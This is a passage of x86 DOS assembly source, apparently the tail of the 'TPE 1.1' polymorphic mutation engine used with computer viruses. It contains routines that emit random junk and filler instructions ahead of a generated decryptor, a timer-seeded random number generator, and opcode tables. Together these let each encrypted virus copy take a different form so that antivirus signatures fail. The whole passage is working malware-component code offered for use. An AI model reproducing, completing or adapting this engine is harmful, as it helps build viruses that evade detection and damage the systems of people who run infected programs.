                call    rnd_get
                test    al,1
                pop     ax
                je      maybe_not
                add     al,2

maybe_not:
                retn

;--- insert random instructions ---------------------------
 
do_nop:
                test    byte ptr ds: flags,2

yes_nop:
                je      no_nop
                call    rnd_get
                test    al,3
                je      nop8
                test    al,2
                je      nop16

b0633b          equ     $+01h
                test    al,1
                je      nop16x

no_nop:
                retn

;--- insert random nop (or not) ---------------------------
 
do_junk:
                test    byte ptr ds:flags,4
                je      no_junk
                call    rnd_get         ;put a random number of
                and     ax,0fh          ; dummy instructions before
                inc     ax              ; decryptor
                xchg    ax,cx

junk_loop:
                call    junk
                loop    junk_loop

no_junk:
                retn
 
junk:
                call    rnd_get
                and     ax,01eh
                jmp     short aa0

nop16x:
                call    rnd_get
                and     ax,6

aa0:
                xchg    ax,si
                call    rnd_get
                jmp     word ptr ds:junk_cals[si]


;-----------------------------------------------------

junk_cals:
                dw      offset nop16x0
                dw      offset nop16x1
                dw      offset nop16x2
                dw      offset nop16x3
                dw      offset nop8
                dw      offset nop16
                dw      offset junk6
                dw      offset junk7
                dw      offset junk8
                dw      offset junk9
                dw      offset junkA
                dw      offset junkB
                dw      offset junkC
                dw      offset junkD
                dw      offset junkE
                dw      offset junkF

;-----------------------------------------------------

nop16x0:
                add     byte ptr [si],cl        ;J* 0000 (conditional)
                jo      yes_nop                 ;jump on overflow
                retn

nop16x1:
                mov     al,0ebh                 ;JMP xxxx/junk
                and     ah,7
                inc     ah
                stosw
                xchg    ah,al                   ;get length of bullshit
                cbw                             ;convert AL to AX
                jmp     fill_bullshit

nop16x2:
                call    junkD                   ;XCHG AX,reg/XCHG AX,reg
                stosb
                retn

nop16x3:
                call    junkF                   ;INC/DEC or DEC/INC
                xor     al,8
                stosb
                retn

nop8:
                push    bx
                and     al,7
                lea     bx,word ptr nop_data8
                xlat
                stosb
                pop     bx
                retn

nop16:
                push    bx
                and     ax,0303h
                lea     bx,word ptr nop_data16
                xlat
                add     al,ah
                stosb
                call    rnd_get
                and     al,7
                mov     bl,9
                mul     bl
                add     al,0c0h
                stosb
                pop     bx
                retn

junk6:
                push    cx
                mov     al,0e8h
                and     ah,0fh          ;CALL xxxx/junk/POP reg
                inc     ah
                stosw
                xor     al,al
                stosb
                xchg    ah,al
                call    fill_bullshit
                call    do_nop
                call    rnd_get         ;insert POP reg
                and     al,7
                call    no_sp
                mov     cx,ax
                or      al,58h
                stosb
                test    ch,3            ;more?
                jne     junk6_ret
                call    do_nop
                mov     ax,0f087h       ;insert XCHG SI,reg
                or      ah,cl
                test    ch,8
                je      j6_1
                mov     al,8bh

j6_1:
                stosw
                call    do_nop
                push    bx
                call    rnd_get
                xchg    ax,bx
                and     bx,0f7fbh       ;insert XOR [SI],xxxx
                or      bl,8
                call    do_xor
                pop     bx

junk6_ret:
                pop     cx
                retn

junk7:
                and     al,0fh          ;MOV reg,xxxx
                or      al,0b0h
                call    no_sp
                stosb
                test    al,8
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junk8:
                and     ah,39h          ;DO r/m,r(8,16)
                or      al,0c0h
                call    no_sp
                xchg    ah,al
                stosw
                retn

junk9:
                and     al,3bh          ;DO r(8,16),r/m
                or      al,2
                and     ah,3fh
                call    no_sp2
                call    no_bp
                stosw
                retn

junkA:
                and     ah,1            ;DO rm,xxxx
                or      ax,80c0h
                call    no_sp
                xchg    ah,al
                stosw
                test    al,1
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junkB:
                call    nop8              ;NOP/LOOP
                mov     ax,0fde2h
                stosw
                retn

junkC:
                and     al,9            ;CMPS* or SCAS*
                test    ah,1
                je      mov_test
                or      al,0a6h
                stosb
                retn

mov_test:
                or      al,0a0h         ;MOV AX,[xxxx] or TEST AX,xxxx
                stosb
                cmp     al,0a8h
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junkD:
                and     al,7            ;XCHG AX,reg
                or      al,90h
                call    no_sp
                stosb
                retn

junkE:
                and     ah,7
                or      ah,50h
                mov     al,ah
                or      ah,8
                stosw
                retn
 
junkF:
                and     al,0fh          ;INC/DEC
                or      al,40h
                call    no_sp
                stosb
                retn

;--- store a byte or a word -------------------------------

byte_word:
                je      only_byte
                stosw
                retn

only_byte:
                stosb
                retn

;--- don't fuck with sp -----------------------------------
 
no_sp:
                push    ax
                and     al,7
                cmp     al,4
                pop     ax
                jne     no_sp_ret
                and     al,0fbh

no_sp_ret:
                retn

;--- don't fuck with sp -----------------------------------
 
no_sp2:
                push    ax
                and     ah,38h
                cmp     ah,20h
                pop     ax
                jne     no_sp2_ret
                xor     ah,20h

no_sp2_ret:
                retn

;--- don't use [bp + ..] ----------------------------------
 
no_bp:
                test    ah,4
                jne     no_bp2
                and     ah,0fdh
                retn

no_bp2:
                push    ax
                and     ah,7
                cmp     ah,6
                pop     ax
                jne     no_bp_ret
                or      ah,1

no_bp_ret:
                retn

;--- write byte for JMP/CAL and fill with random bullshit -
 
fill_bullshit:
                push    cx
                xchg    ax,cx

bull_lup:
                call    rnd_get
                stosb
                loop    bull_lup
                pop     cx
                retn

;--- random number generator ------------------------------

rnd_init:
                push    ax
                push    cx
                call    random_init0
                and     ax,0h
                inc     ax
                xchg    ax,cx

random_lup:
                call    rnd_get         ;cal random routine a few
                loop    random_lup      ; times to 'warm up'
                pop     cx
                pop     ax
                retn
 
random_init0:
                push    dx              ;initialize generator
                push    cx
                mov     ah,2ch
                int     21h             ;get time CH,CL:DH,DL
                in      al,40h          ;timer
                mov     ah,al
                in      al,40h          ;timer
                xor     ax,cx
                xor     dx,ax
                jmp     short mov_rnd
 
rnd_get:
                push    dx              ;calculate random number
                push    cx
                push    bx
                in      al,40h

d06502          equ     $+01h
                add     ax,0000h

d06505          equ     $+01h
                mov     dx,0000h
                mov     cx,0007h

rnd_lup:
                shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_12
                inc     al

rnd_12:
                loop    rnd_lup
                pop     bx

mov_rnd:
                mov     word ptr cs:d06502,ax
                mov     word ptr cs:d06505,dx
                mov     al,dl
                pop     cx
                pop     dx
                retn

;-----------------------------------------------------
;.data

mov_byte        db      0b8,0b0,0b4,00          ;AX,AL,AH,..
                db      0b8,0b3,0b7,00          ;BX,GL,GH,..
                db      0b9,0b1,0b5             ;CX,CL,CH

nop_data8       db      90,0f8,0f9,0f5          ;NOP,CLC,STC,CMC
                db      0fa,0fc,45,4dh          ;CLI,CLD,INC BP,DEC BP

nop_data16      db      08,20,84,88             ;OR,AND,XCHG,MOV

dir_change      db      07,07,04,05             ;BL/BH,BX,SI,DI

ind_change      db      03,03,06,07             ;BL/BH,BX,SI,DI

how_mode        db      30,30,00,28             ;XOR,XOR,ADD,SUB

alt_code        dw      0c800h,0c0f0h           ;ADD AL,CL,????

add_val         dw      0
xor_val         dw      0
xor_offset      dw      0
where_len       dw      0
where_len2      dw      0
store_mov       db      0
flags           db      0

                db      '[TPE 1.1]'

tpe_bottom      equ     $
 
                end     tpe_top
 
 